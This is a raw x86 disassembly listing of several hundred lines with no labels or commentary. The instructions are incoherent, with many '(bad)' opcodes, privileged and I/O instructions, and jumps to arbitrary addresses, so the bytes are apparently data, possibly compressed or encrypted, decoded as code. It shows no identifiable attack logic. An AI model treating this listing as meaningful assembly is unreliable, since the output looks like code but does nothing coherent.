  4200aa:	inc    esi
  4200ab:	cli    
  4200ac:	xchg   ecx,eax
  4200ad:	mov    cl,0x1b
  4200af:	iret   
  4200b0:	inc    esi
  4200b1:	rcl    DWORD PTR [ebx-0x1e52be43],1
  4200b7:	sbb    WORD PTR [ebp-0x16],0xfff5
  4200bc:	(bad)  
  4200be:	sbb    DWORD PTR [eax],eax
  4200c0:	call   0xace7:0xc98b4f06
  4200c7:	inc    esp
  4200c8:	cld    
  4200c9:	mov    bh,0x5
  4200cb:	and    edx,DWORD PTR [eax]
  4200cd:	stos   DWORD PTR es:[edi],eax
  4200ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200cf:	sub    DWORD PTR [edi-0x16f3f54a],ebp
  4200d5:	imul   esp,DWORD PTR [eax+0x2a],0xb5699a10
  4200dc:	mov    ds:0x354f5066,eax
  4200e1:	or     al,0xd1
  4200e3:	stos   DWORD PTR es:[edi],eax
  4200e4:	dec    edi
  4200e5:	cmp    ah,BYTE PTR [ebp+0x19f17da]
  4200eb:	aaa    
  4200ec:	js     0x420084
  4200ee:	mov    al,BYTE PTR [esi-0x72]
  4200f1:	mov    cl,0x63
  4200f3:	push   ebx
  4200f4:	popf   
  4200f5:	sub    BYTE PTR [ebx-0x18abac64],cl
  4200fb:	(bad)  
  4200fd:	pop    ebp
  4200fe:	in     al,0x2d
  420100:	cli    
  420101:	loopne 0x4200e4
  420103:	cmp    BYTE PTR [esi],0x94
  420106:	push   edi
  420107:	cli    
  420108:	jno    0x4200ea
  42010a:	pop    esi
  42010b:	addr16 push esi
  42010d:	or     DWORD PTR [ebx+esi*1-0xd],edi
  420111:	lods   al,BYTE PTR ds:[esi]
  420112:	mov    eax,0x989830fe
  420117:	jno    0x42009b
  420119:	ins    BYTE PTR es:[edi],dx
  42011a:	adc    bl,BYTE PTR [edi-0x6f603e2b]
  420120:	int3   
  420121:	add    DWORD PTR [edi],edi
  420123:	imul   edx,DWORD PTR [eax],0xffffffbb
  420126:	imul   eax,DWORD PTR [edx+0x16b5a255],0x3e
  42012d:	jmp    0x866b718c
  420132:	mov    dl,0x6f
  420134:	lahf   
  420135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420136:	jne    0x420158
  420138:	lods   al,BYTE PTR ds:[esi]
  420139:	cmp    ecx,DWORD PTR [ecx+0x76]
  42013c:	fs or  al,0xc4
  42013f:	push   0x932da761
  420144:	ja     0x420195
  420146:	or     bh,BYTE PTR [esi+0x1dfef875]
  42014c:	fwait
  42014d:	push   eax
  42014e:	lock sub al,0x30
  420151:	test   DWORD PTR [esp+ecx*8],eax
  420154:	aad    0xee
  420156:	shr    cl,cl
  420158:	jmp    0x420176
  42015a:	addr16 shr bh,cl
  42015d:	pop    esi
  42015e:	jmp    0x560b2272
  420163:	cmc    
  420164:	inc    edi
  420165:	xchg   BYTE PTR fs:[esi+0x46],dl
  420169:	je     0x420187
  42016b:	inc    ebp
  42016c:	sbb    BYTE PTR [ebp-0x6c7272f],dl
  420172:	ja     0x420170
  420174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420175:	imul   esp,esp,0xfc3416fb
  42017b:	xchg   ebp,eax
  42017c:	sub    eax,0x82e06d6b
  420181:	loope  0x4201a8
  420183:	cld    
  420184:	mov    cs,WORD PTR [eax+edi*1]
  420187:	xchg   ecx,eax
  420188:	cwde   
  420189:	pop    ebx
  42018a:	jnp    0x4201b8
  42018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018d:	mov    WORD PTR [ebx],ss
  42018f:	scas   eax,DWORD PTR es:[edi]
  420190:	mov    ebx,0xe3c12e3d
  420195:	sbb    DWORD PTR [ebx-0x52],esi
  420198:	dec    ecx
  420199:	call   0x8086aa4
  42019e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42019f:	lods   eax,DWORD PTR fs:[esi]
  4201a1:	rol    DWORD PTR [esi+0x4d0479fd],0xeb
  4201a8:	sub    edx,DWORD PTR [edi]
  4201aa:	rcl    DWORD PTR [esi+0x53827d21],1
  4201b0:	mov    ebx,0xefecf24f
  4201b5:	sbb    eax,0x6fc67ff8
  4201ba:	pop    ecx
  4201bb:	or     DWORD PTR [ebx-0x4403303e],edi
  4201c1:	xchg   DWORD PTR [edi+0xf25245],ebx
  4201c7:	and    BYTE PTR [eax+0xb888131],bh
  4201cd:	iret   
  4201ce:	adc    BYTE PTR [ebx+0x47376b31],bh
  4201d4:	pop    DWORD PTR [ebp-0x4c456f0d]
  4201da:	push   cs
  4201db:	aas    
  4201dc:	pop    es
  4201dd:	ja     0x42021e
  4201df:	jns    0x420252
  4201e1:	dec    ecx
  4201e2:	or     al,0x12
  4201e4:	pop    eax
  4201e5:	jp     0x420208
  4201e7:	lods   eax,DWORD PTR ds:[esi]
  4201e8:	icebp  
  4201e9:	imul   ebx,eax,0xffffffbb
  4201ec:	mov    ecx,0x798e5a5b
  4201f1:	adc    al,0x93
  4201f4:	(bad)  
  4201f5:	sub    dh,BYTE PTR [ebx+0x5a]
  4201f8:	or     edx,DWORD PTR [ebx+0x2b]
  4201fb:	cmp    cl,BYTE PTR [edx+eax*4]
  4201fe:	sahf   
  4201ff:	enter  0x3ce3,0xfc
  420203:	xchg   edx,eax
  420204:	daa    
  420205:	pop    edx
  420206:	and    al,0x3a
  420208:	push   ds
  420209:	pop    esi
  42020a:	out    dx,al
  42020b:	cwde   
  42020c:	pop    es
  42020d:	pusha  
  42020e:	fcmovb st,st(5)
  420210:	lds    ebp,FWORD PTR [esi-0x6bf49542]
  420216:	push   esp
  420217:	imul   eax,ebx,0x8e31fec8
  42021d:	jp     0x420296
  42021f:	inc    esi
  420220:	xchg   esp,eax
  420221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420222:	mov    ss:0x58088d8b,eax
  420228:	push   esi
  420229:	dec    ebp
  42022a:	stc    
  42022b:	addr16 es inc ebx
  42022e:	popf   
  42022f:	leave  
  420230:	inc    eax
  420231:	repnz in al,dx
  420233:	shl    BYTE PTR [ecx],0xdd
  420236:	cmp    eax,0xae9e86c
  42023b:	or     cl,BYTE PTR [ecx]
  42023d:	out    dx,al
  42023e:	(bad)  
  42023f:	fcomp  DWORD PTR [ebp+0x4b]
  420242:	dec    eax
  420243:	pop    edi
  420244:	adc    eax,0xd708bf6d
  420249:	nop
  42024a:	inc    esi
  42024b:	inc    BYTE PTR [ecx+0x0]
  420251:	add    BYTE PTR [esi+0x57fe4584],dl
  420257:	(bad)  
  420258:	mov    edi,0xa59b80ec
  42025d:	and    BYTE PTR [ebx-0x409a7209],cl
  420263:	jl     0x420266
  420265:	add    bl,dh
  420267:	add    al,0x0
  420269:	add    dl,ch
  42026b:	push   ds
  42026c:	aas    
  42026d:	pop    ebp
  42026e:	ficomp WORD PTR [eax+0x27210bde]
  420274:	dec    esp
  420275:	popf   
  420276:	jp     0x42024c
  420278:	popa   
  420279:	lfs    esp,FWORD PTR [ebx-0x1a808761]
  420280:	mov    al,bh
  420282:	imul   ebx,DWORD PTR [edx],0x43
  420285:	and    BYTE PTR [ebx+0x4de0db43],cl
  42028b:	shl    BYTE PTR [ebx+0x3965bd2e],cl
  420291:	pop    esi
  420292:	outs   dx,DWORD PTR ds:[esi]
  420293:	pop    ebx
  420294:	push   cs
  420295:	sbb    ecx,DWORD PTR [ebx-0x15666e88]
  42029b:	imul   edi,DWORD PTR [eax+ebp*1-0x35],0x74
  4202a0:	cmp    DWORD PTR [edx],esp
  4202a2:	sub    eax,0x4d44f865
  4202a7:	push   ebx
  4202a8:	jo     0x4202d9
  4202aa:	cmp    al,0xe2
  4202ac:	aam    0x21
  4202ae:	jns    0x420233
  4202b0:	mov    cl,0x6d
  4202b2:	mov    esp,0x20ea1576
  4202b7:	push   ss
  4202b8:	xchg   esp,eax
  4202b9:	mov    ch,BYTE PTR [ebp-0x50]
  4202bc:	test   ebx,esi
  4202be:	outs   dx,DWORD PTR ds:[esi]
  4202bf:	cmp    cl,BYTE PTR [ebx+0x51679041]
  4202c5:	sbb    al,0x12
  4202c7:	std    
  4202c8:	inc    ebp
  4202c9:	std    
  4202ca:	jecxz  0x4202f7
  4202cc:	mov    BYTE PTR [eax+0x21027b1c],cl
  4202d2:	lea    edx,[ecx+0x22c09f99]
  4202d8:	lahf   
  4202d9:	mov    esp,0x1c3b4319
  4202de:	cmp    eax,0xf23665d2
  4202e3:	in     al,dx
  4202e4:	inc    ebp
  4202e5:	stos   BYTE PTR es:[edi],al
  4202e6:	mov    al,ds:0x6fcfaadd
  4202eb:	stos   DWORD PTR es:[edi],eax
  4202ec:	pop    esp
  4202ed:	xchg   edi,eax
  4202ee:	adc    ecx,DWORD PTR [edx+ebx*1]
  4202f1:	adc    BYTE PTR [eax+0x717668ab],bl
  4202f7:	mov    DWORD PTR [edi-0x6a],ebp
  4202fa:	jg     0x420298
  4202fc:	inc    esp
  4202fd:	out    dx,eax
  4202fe:	mov    bh,0xf2
  420300:	cmp    cl,BYTE PTR [ecx]
  420302:	fimul  WORD PTR [eax+0x68]
  420306:	icebp  
  420307:	adc    BYTE PTR [edx-0x514c072f],0x2e
  42030e:	and    BYTE PTR [ebx],ch
  420310:	xchg   BYTE PTR [edi-0x6dc6bf8a],cl
  420316:	dec    edx
  420317:	inc    esi
  420318:	push   es
  420319:	inc    edi
  42031a:	cmp    DWORD PTR [edx],0x13
  42031d:	jp     0x420324
  42031f:	in     al,0x11
  420321:	je     0x4202db
  420323:	fs lahf 
  420325:	mov    ebp,0x4c3be8a7
  42032a:	std    
  42032b:	fdivr  DWORD PTR [ebx-0x4beb39c5]
  420331:	fldl2e 
  420333:	ins    DWORD PTR es:[edi],dx
  420334:	jecxz  0x4203a4
  420336:	cmc    
  420337:	add    al,0x55
  420339:	xor    al,0xd2
  42033b:	into   
  42033c:	icebp  
  42033d:	mov    ah,BYTE PTR [eax+0x12]
  420340:	data16 sahf 
  420342:	gs (bad) 
  420345:	pushf  
  420346:	adc    dl,BYTE PTR [eax-0x6a]
  420349:	adc    eax,0xa59ad6b7
  42034e:	mov    BYTE PTR [eax+0x63],bh
  420351:	inc    ebp
  420352:	ins    DWORD PTR es:[edi],dx
  420353:	push   edi
  420354:	mov    WORD PTR [edx+edx*1+0x1e26651a],?
  42035b:	in     eax,0xf2
  42035d:	adc    dl,BYTE PTR ds:0x82a40714
  420363:	fadd   st(2),st
  420365:	cmp    eax,0x1e949b1a
  42036a:	mov    bl,al
  42036c:	pop    edx
  42036d:	shl    BYTE PTR [eax+0x4fca3616],1
  420373:	call   0xb8a24f6a
  420378:	lds    ecx,FWORD PTR [ebx+0xc]
  42037b:	shr    DWORD PTR [edi+0xdbb8935],0xa9
  420382:	popf   
  420383:	lock icebp 
  420385:	ret    0x560f
  420388:	inc    edx
  420389:	icebp  
  42038a:	jnp    0x4203cf
  42038c:	jo     0x4203d6
  42038e:	aas    
  42038f:	jecxz  0x4203dc
  420391:	push   ss
  420392:	ret    
  420393:	loop   0x420344
  420395:	je     0x420323
  420397:	fistp  QWORD PTR [esi-0x161f0620]
  42039d:	pop    eax
  42039e:	xchg   esi,eax
  42039f:	in     eax,dx
  4203a0:	add    al,0x2a
  4203a2:	push   ds
  4203a3:	cmp    ebp,esp
  4203a5:	ins    BYTE PTR es:[edi],dx
  4203a6:	imul   esi,DWORD PTR [eax-0x8c701bc],0xffffffcd
  4203ad:	outs   dx,DWORD PTR ds:[esi]
  4203ae:	pop    ecx
  4203af:	mov    ebp,0x2ebdb3d0
  4203b4:	sub    edi,ebp
  4203b6:	sub    ch,BYTE PTR [ecx]
  4203b8:	and    eax,esp
  4203ba:	jl     0x420396
  4203bc:	cdq    
  4203bd:	test   ecx,0xe8b6a7d
  4203c3:	jmp    0x4203a1
  4203c5:	dec    ebp
  4203c6:	mov    dh,0xe
  4203c8:	shl    BYTE PTR [si],1
  4203cb:	and    DWORD PTR [edx+0x63],esi
  4203ce:	int    0xfa
  4203d0:	jg     0x42041f
  4203d2:	sub    esi,DWORD PTR [edi-0x57da3ba2]
  4203d8:	loopne 0x42042a
  4203da:	pop    edi
  4203db:	cmp    eax,0xf92d7744
  4203e0:	xor    al,0xf1
  4203e2:	in     al,0x5e
  4203e4:	or     bh,0x95
  4203e7:	jbe    0x420413
  4203e9:	or     BYTE PTR [ebp+0x49],cl
  4203ec:	pop    ebx
  4203ed:	js     0x4203ea
  4203ef:	ds ret 
  4203f1:	cmp    DWORD PTR [edi+0x24e72585],eax
  4203f7:	xor    eax,0xba31daa1
  4203fc:	mov    fs,WORD PTR [ecx]
  4203fe:	(bad)  
  4203ff:	leave  
  420400:	ja     0x420427
  420402:	mov    dl,0xb6
  420404:	inc    eax
  420405:	xor    BYTE PTR [esi-0x71],bh
  420408:	adc    eax,0xbb76a3d
  42040d:	aam    0x71
  42040f:	mov    dh,0x6d
  420411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420412:	popf   
  420413:	and    al,0xdd
  420415:	sbb    al,bl
  420417:	xchg   ebx,eax
  420418:	stc    
  420419:	das    
  42041a:	pushf  
  42041b:	pop    ecx
  42041c:	test   ch,bh
  42041e:	mov    edi,0x5d698ef0
  420423:	pop    ebx
  420424:	ret    
  420425:	cwde   
  420426:	xchg   ebx,eax
  420427:	mov    ch,0xb1
  420429:	xchg   ebx,eax
  42042a:	cli    
  42042b:	xor    eax,0xd24d15bb
  420430:	test   al,0xf8
  420432:	pop    edx
  420433:	and    bl,BYTE PTR ds:0x38f8f140
  420439:	jae    0x420441
  42043b:	xor    al,0xb
  42043d:	mov    bh,0xec
  42043f:	repz cmc 
  420441:	les    ebx,FWORD PTR [ecx+0x7b]
  420444:	clc    
  420445:	fs mov edi,ss
  420448:	adc    BYTE PTR [eax],bh
  42044a:	les    esi,FWORD PTR [ecx]
  42044c:	inc    edx
  42044d:	inc    ebx
  42044e:	xchg   edi,eax
  42044f:	adc    al,0x31
  420451:	jmp    0x42048c
  420453:	lea    ecx,[ebp+edx*8+0x73]
  420457:	and    cl,al
  420459:	je     0x4203e6
  42045b:	mov    bl,0xe5
  42045d:	(bad)  
  42045e:	pop    edx
  42045f:	(bad)  
  420460:	int    0x13
  420462:	xor    BYTE PTR [ebp+ebx*1-0x5675dd7],ch
  420469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42046a:	pop    edx
  42046b:	or     ecx,DWORD PTR [eax]
  42046d:	push   ds
  42046e:	or     DWORD PTR [esi],ebp
  420470:	add    eax,0x3dc79568
  420475:	bound  esp,QWORD PTR [esi+0x46236dad]
  42047b:	sahf   
  42047c:	std    
  42047d:	mov    al,ds:0x3f572d3f
  420482:	ja     0x42041c
  420484:	mov    DWORD PTR [esp+edx*2],esi
  420487:	int3   
  420488:	(bad)  
  420489:	fldcw  WORD PTR [edi-0x5fc3cfd0]
  42048f:	and    cl,dh
  420491:	in     al,0xe6
  420493:	add    al,0xb4
  420495:	mov    ds:0xc86e47a4,al
  42049a:	clc    
  42049b:	sahf   
  42049c:	(bad)  
  42049d:	pop    ecx
  42049e:	inc    edx
  42049f:	mov    dl,0x83
  4204a1:	dec    esp
  4204a2:	scas   al,BYTE PTR es:[edi]
  4204a3:	test   BYTE PTR [eax],ah
  4204a5:	fist   DWORD PTR [esi+ecx*8-0x4d]
  4204a9:	and    dl,bh
  4204ab:	aas    
  4204ac:	mov    ah,0xf
  4204ae:	ins    BYTE PTR es:[edi],dx
  4204af:	je     0x420460
  4204b1:	sbb    eax,DWORD PTR [esi+0x2e39f92d]
  4204b7:	aaa    
  4204b8:	mov    dl,0xeb
  4204ba:	int    0xdf
  4204bc:	adc    esp,DWORD PTR [ebp+0x48]
  4204bf:	mov    bh,0x1d
  4204c1:	add    BYTE PTR cs:[ecx],bh
  4204c4:	les    eax,FWORD PTR [ecx]
  4204c6:	cwde   
  4204c7:	xchg   bh,bl
  4204c9:	sbb    BYTE PTR [ebp+0x4f],bl
  4204cc:	mov    esi,0xc63a952f
  4204d1:	in     al,dx
  4204d2:	push   edx
  4204d3:	xchg   DWORD PTR [ebx+0x18],edx
  4204d6:	test   DWORD PTR [edx],esi
  4204d8:	push   0xee8becd1
  4204dd:	iret   
  4204de:	sub    al,0xda
  4204e0:	mov    dl,0xe3
  4204e2:	shl    BYTE PTR ds:0x406e6d84,0xa9
  4204e9:	inc    esi
  4204ea:	jg     0x420543
  4204ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204ed:	fstp   st(1)
  4204ef:	adc    eax,0xccb7aa39
  4204f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204f6:	iret   
  4204f7:	push   ss
  4204f8:	das    
  4204f9:	ins    DWORD PTR es:[edi],dx
  4204fa:	add    ch,cl
  4204fc:	and    al,0xd5
  4204fe:	adc    DWORD PTR [esi],esi
  420500:	mov    esp,?
  420502:	mov    ebp,0xacf4fed5
  420507:	je     0x4204ea
  420509:	fldcw  WORD PTR [eax+0x698275c4]
  42050f:	inc    ecx
  420510:	push   ss
  420511:	pusha  
  420512:	jl     0x4204f7
  420514:	push   ds
  420515:	icebp  
  420516:	or     edi,0x6907ac46
  42051c:	int    0x18
  42051e:	adc    eax,0xea6ee41c
  420523:	inc    ebx
  420524:	sbb    BYTE PTR [edi+ecx*4],bl
  420527:	mov    cl,bl
  420529:	pop    es
  42052a:	pop    ebp
  42052b:	add    eax,0xf4ca77c1
  420530:	jl     0x42051d
  420532:	fs retf 
  420534:	iret   
  420535:	aas    
  420536:	push   ebx
  420537:	das    
  420538:	inc    ecx
  420539:	dec    ecx
  42053a:	(bad)  
  42053b:	jmp    0x99fe9d3e
  420540:	lds    esi,FWORD PTR gs:[esi-0x12caa44e]
  420547:	(bad)  
  420548:	jmp    0x3a54b095
  42054d:	mov    ds:0xe6aca543,al
  420552:	dec    ebx
  420553:	and    BYTE PTR [ecx],0x24
  420556:	iret   
  420557:	and    ecx,DWORD PTR [eax-0x68]
  42055a:	add    cl,BYTE PTR [edi+ebp*4]
  42055d:	push   esi
  42055e:	sub    DWORD PTR [ecx+0x1],esp
  420561:	mov    ebp,0xcc798966
  420566:	mov    ebx,0xc8e90f3b
  42056b:	mov    ch,0x83
  42056d:	mov    ds:0xb2ce5985,al
  420572:	adc    BYTE PTR [edi],0xf7
  420575:	push   ebx
  420576:	jecxz  0x420549
  420578:	mov    dl,0xc0
  42057a:	pop    es
  42057b:	ror    bh,0x47
  42057e:	jecxz  0x42052a
  420580:	fcom   DWORD PTR [ebx+0x3a]
  420583:	push   ebp
  420584:	ret    0xe3e
  420587:	push   esi
  420588:	mov    ebx,0x77f7651c
  42058d:	add    ebx,DWORD PTR [ecx+0x65a89562]
  420593:	push   edx
  420594:	scas   eax,DWORD PTR es:[edi]
  420595:	push   0x43
  420597:	or     ah,ah
  420599:	mov    ecx,0x3ab0ce89
  42059e:	mov    ds:0x8bf8e447,eax
  4205a3:	jl     0x4205f6
  4205a5:	or     dl,BYTE PTR [esi]
  4205a7:	and    ah,BYTE PTR ds:0x5fb791d5
  4205ad:	fdiv   QWORD PTR ds:[ecx-0x2e2ae4be]
  4205b4:	mov    ss,WORD PTR [ecx+0x49]
  4205b7:	lock sbb eax,0x1ebac22e
  4205bd:	fcomp  QWORD PTR fs:[ebp-0x245e3537]
  4205c4:	add    DWORD PTR [eax-0x6bf7a831],esi
  4205ca:	mov    eax,0xb3aaed96
  4205cf:	test   eax,0x41d0c920
  4205d4:	sub    esp,DWORD PTR [eax-0x56]
  4205d7:	xor    ebp,DWORD PTR [ebx-0x264f78a7]
  4205dd:	push   ss
  4205de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205df:	ror    DWORD PTR [ebp+0x286abfd8],1
  4205e5:	xor    bl,ch
  4205e7:	cli    
  4205e8:	jg     0x4205b7
  4205ea:	lds    esi,FWORD PTR [ebx-0x35eef2a7]
  4205f0:	dec    edi
  4205f1:	int    0xa
  4205f3:	push   edi
  4205f4:	aaa    
  4205f5:	sbb    DWORD PTR [ecx+esi*1],0x6f96a85
  4205fc:	or     al,0xb1
  4205fe:	inc    dh
  420600:	cdq    
  420601:	aam    0x4d
  420603:	jle    0x420640
  420605:	shl    BYTE PTR [ecx-0x38],cl
  420608:	cs out 0x34,al
  42060b:	call   0x5b46ecb1
  420610:	cld    
  420611:	pushf  
  420612:	and    al,0x47
  420614:	data16 sti 
  420616:	xchg   BYTE PTR [edi+0x28],ch
  420619:	test   al,0xea
  42061b:	lea    esp,[ebp+eiz*1+0xb]
  42061f:	jnp    0x420678
  420621:	adc    ch,bh
  420623:	fdiv   DWORD PTR [eax]
  420625:	jecxz  0x42063b
  420627:	mov    ds:0xe77ab2a3,eax
  42062c:	xchg   edx,eax
  42062d:	and    esp,DWORD PTR [ebx]
  42062f:	push   0x7a
  420631:	and    edi,DWORD PTR ds:0xa2824bd9
  420637:	dec    ebp
  420638:	push   ds
  420639:	xchg   esi,eax
  42063a:	mov    edi,0xdfbd0953
  42063f:	sub    BYTE PTR [edi+0x261dbc7c],dl
  420645:	test   al,0x43
  420647:	mov    bl,BYTE PTR [esi]
  420649:	inc    esp
  42064a:	push   ecx
  42064b:	and    eax,0xf7be9f4f
  420650:	sbb    BYTE PTR [ecx],0x4b
  420653:	outs   dx,DWORD PTR ds:[esi]
  420654:	sbb    al,0x5b
  420656:	xlat   BYTE PTR ds:[ebx]
  420657:	mov    bl,0x44
  420659:	mov    al,ds:0x16c9861d
  42065e:	hlt    
  42065f:	xchg   ebx,eax
  420660:	sbb    esp,DWORD PTR [ebp+0x69]
  420663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420664:	in     al,dx
  420665:	pop    ebx
  420666:	cmp    DWORD PTR [ecx],esi
  420668:	test   DWORD PTR [ecx+0x45dda5fd],esp
  42066e:	clc    
  42066f:	xchg   ebx,eax
  420670:	shl    BYTE PTR [ebp-0x44],cl
  420673:	and    DWORD PTR [ebx],eax
  420675:	repnz stos DWORD PTR es:[edi],eax
  420677:	dec    edx
  420678:	std    
  420679:	pop    edi
  42067a:	push   eax
  42067b:	dec    esp
  42067c:	(bad)  
  42067e:	jo     0x4206d2
  420680:	scas   eax,DWORD PTR es:[edi]
  420681:	fnstenv [edx]
  420683:	mov    WORD PTR [esi+eax*8-0x75],ds
  420687:	mov    BYTE PTR [esi+ebx*1],bl
  42068a:	pop    ds
  42068b:	cmp    al,0xbe
  42068d:	(bad)  
  42068e:	xchg   bh,al
  420690:	mov    esp,0x6f7b592f
  420695:	and    cl,BYTE PTR [edi]
  420697:	sbb    DWORD PTR [eax-0x1c9ae02e],edx
  42069d:	mov    BYTE PTR [esi],al
  42069f:	mov    dh,0x65
  4206a1:	mov    ss,WORD PTR [ebx+0x74115e54]
  4206a7:	loope  0x4206fc
  4206a9:	adc    DWORD PTR [ebx],eax
  4206ab:	mov    bl,BYTE PTR [edi+0x38]
  4206ae:	pop    eax
  4206af:	out    dx,eax
  4206b0:	lods   eax,DWORD PTR ds:[esi]
  4206b1:	pop    eax
  4206b2:	clc    
  4206b3:	mov    ebx,0x8593ef64
  4206b8:	repz and dl,BYTE PTR [edi+0x52]
  4206bc:	mov    DWORD PTR [ecx+ebp*2],edi
  4206bf:	clc    
  4206c0:	mov    edi,0x5c02b562
  4206c5:	cmp    cl,BYTE PTR [edi+ecx*2-0x580ed6d1]
  4206cc:	sbb    DWORD PTR [ebp+0x48981673],0x3b
  4206d3:	dec    eax
  4206d4:	inc    esi
  4206d5:	or     esp,ebp
  4206d7:	jo     0x42067c
  4206d9:	jae    0x4206d7
  4206db:	xor    eax,0x84f94442
  4206e0:	fidiv  DWORD PTR [eax+0x39]
  4206e3:	xchg   esi,eax
  4206e4:	push   ebp
  4206e5:	jp     0x420745
  4206e7:	xor    esi,DWORD PTR [ebx-0x3ff5e210]
  4206ed:	mov    ds:0xb7651fd0,eax
  4206f2:	jge    0x4206a7
  4206f4:	enter  0x4eb1,0x48
  4206f8:	mov    al,ds:0x44e7a805
  4206fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206fe:	les    edx,FWORD PTR [ecx+ebx*8+0x11]
  420702:	ins    BYTE PTR es:[edi],dx
  420703:	gs jmp 0x42075d
  420706:	mov    esp,edx
  420708:	call   0x46d4:0xb63463cc
  42070f:	out    0xd4,al
  420711:	or     DWORD PTR [edi],ebp
  420713:	push   0xfffffffc
  420715:	test   DWORD PTR ds:0x521beaed,edx
  42071b:	jmp    0xe8eb7d42
  420720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420721:	push   0xbba4fa45
  420726:	push   0xcd84df6e
  42072b:	mov    cl,BYTE PTR [edi]
  42072d:	jmp    0x123d:0x6e20d716
  420734:	cmp    ch,bh
  420736:	push   ecx
  420737:	mov    bl,0xf4
  420739:	pop    ebp
  42073a:	or     eax,0x5ef2ea8
  42073f:	push   0x3fbbf3dc
  420744:	mov    eax,gs:0xd5c47c57
  42074a:	jne    0x42074e
  42074c:	sub    DWORD PTR [ecx+0x37197168],ecx
  420752:	mov    ebp,0xddf559d4
  420757:	aam    0x98
  420759:	ins    DWORD PTR es:[edi],dx
  42075a:	xor    ebx,esi
  42075c:	pop    ecx
  42075d:	add    BYTE PTR [eax],al
  42075f:	add    BYTE PTR [eax],al
  420761:	add    BYTE PTR [ecx],ah
  420763:	pop    ds
  420764:	fld    QWORD PTR [esi]
  420766:	inc    esi
  420768:	sti    
  420769:	aas    
  42076a:	jb     0x42078b
  42076c:	add    edx,edx
  42076e:	or     dl,cl
  420770:	std    
  420771:	mov    dh,BYTE PTR [edx-0xcfffe7f]
  420777:	add    al,0x0
  420779:	add    al,bl
  42077b:	xchg   ebp,eax
  42077c:	xor    DWORD PTR [esi-0xec69f73],edx
  420782:	sbb    esp,edi
  420784:	and    edi,DWORD PTR [ecx+esi*1]
  420787:	push   0xfab87390
  42078c:	push   edi
  42078d:	mov    ?,ecx
  42078f:	sbb    eax,0x7797264e
  420794:	dec    esp
  420795:	jo     0x420791
  420797:	sti    
  420798:	out    dx,eax
  420799:	leave  
  42079a:	outs   dx,BYTE PTR ds:[esi]
  42079b:	(bad)  
  42079c:	jmp    0x93c97835
  4207a1:	push   ebx
  4207a2:	mov    eax,0x2f696be6
  4207a7:	mov    esp,DWORD PTR [eax]
  4207a9:	addr16 mov ah,0x47
  4207ac:	xor    BYTE PTR [edx],dl
  4207ae:	push   esp
  4207af:	cmp    cl,BYTE PTR [ebp-0x17a14f00]
  4207b5:	test   DWORD PTR [ebp-0x189251a0],ebx
  4207bb:	adc    al,0xf1
  4207bd:	cli    
  4207be:	jnp    0x4207b6
  4207c0:	pusha  
  4207c1:	retf   0x25d8
  4207c4:	xchg   esi,eax
  4207c5:	ret    0xe378
  4207c8:	adc    BYTE PTR [edx-0x5d],bh
  4207cb:	aad    0x27
  4207cd:	and    al,0xe9
  4207cf:	sub    DWORD PTR [edx+eax*1],ebp
  4207d2:	dec    esp
  4207d3:	std    
  4207d4:	jp     0x420756
  4207d6:	pop    esi
  4207d7:	out    dx,eax
  4207d8:	cwde   
  4207d9:	xor    eax,0xf99a26fe
  4207de:	jp     0x4207c0
  4207e0:	pop    ecx
  4207e1:	xor    ecx,DWORD PTR [ebx+0x4a]
  4207e4:	in     al,0x69
  4207e6:	mov    dl,0x4d
  4207e8:	rol    DWORD PTR [edi+0x47],cl
  4207eb:	push   ds
  4207ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207ed:	sbb    al,0xf5
  4207ef:	sub    eax,0x208d9414
  4207f4:	add    al,0x42
  4207f7:	sub    DWORD PTR [edi-0x2506fc20],0x693d3b7a
  420801:	mov    eax,ds:0x9f74db30
  420806:	outs   dx,DWORD PTR ds:[esi]
  420807:	dec    edi
  420808:	sar    BYTE PTR [edi+0x17],cl
  42080b:	push   eax
  42080c:	mov    ah,0x9d
  42080e:	jl     0x420874
  420810:	out    dx,eax
  420811:	lock fwait
  420813:	gs retf 
  420815:	push   ss
  420816:	mov    dh,0x7a
  420818:	inc    ebx
  420819:	icebp  
  42081a:	jp     0x420844
  42081c:	mov    al,0xd4
  42081e:	add    ebp,DWORD PTR [esp+0xe041c29]
  420825:	out    dx,al
  420826:	out    0x11,eax
  420828:	cmp    DWORD PTR [ecx+0x111ce578],esi
  42082e:	fstp   TBYTE PTR [edi]
  420830:	and    DWORD PTR [edx],esp
  420832:	es jmp 0x36d71de6
  420838:	xor    eax,0x9f8ef4e0
  42083d:	leave  
  42083e:	push   0x93a9cdd2
  420843:	cmovg  ecx,edx
  420846:	dec    edx
  420847:	loop   0x420857
  420849:	arpl   WORD PTR [ebx+edi*8-0x3e],bp
  42084d:	adc    BYTE PTR [edi+esi*4-0x77707a7c],0x19
  420855:	or     esi,0xffffffca
  420858:	and    eax,0x58e83c3d
  42085d:	and    esp,esp
  42085f:	sub    DWORD PTR [esi],edx
  420861:	clc    
  420862:	jbe    0x4208c1
  420864:	xor    ah,BYTE PTR [ebx-0x7c6ab1ae]
  42086a:	leave  
  42086b:	and    DWORD PTR [ecx-0x18d5ac4e],edx
  420871:	sahf   
  420872:	stc    
  420873:	iret   
  420874:	mul    BYTE PTR [eax-0x21447445]
  42087a:	pop    edx
  42087b:	dec    ebp
  42087c:	inc    ecx
  42087d:	pop    ebx
  42087e:	or     DWORD PTR [edx+0x33bfaaea],eax
  420884:	mov    cs,WORD PTR [ebx]
  420886:	dec    ecx
  420887:	mov    edx,0xce4e1b6b
  42088c:	dec    edx
  42088d:	aas    
  42088e:	in     eax,dx
  42088f:	push   esi
  420890:	xor    ah,BYTE PTR [edi+0xc]
  420893:	jne    0x4208a2
  420895:	aam    0x6a
  420897:	js     0x42086d
